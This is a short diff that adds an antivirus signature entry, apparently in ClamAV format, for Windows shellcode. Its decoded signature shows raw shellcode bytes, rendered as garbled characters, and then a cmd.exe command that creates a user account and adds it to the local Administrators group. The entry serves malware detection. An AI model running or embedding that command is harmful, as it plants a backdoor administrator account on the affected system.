@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Tool.Shellcode_17545-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+כ[1ְP1ְˆCNS»%†|ÿ׃1ְP»ֻ|ÿ׃טאÿÿÿcmd.exe /c net user kpss 12345 /add && net localgroup Administrators /add kpss
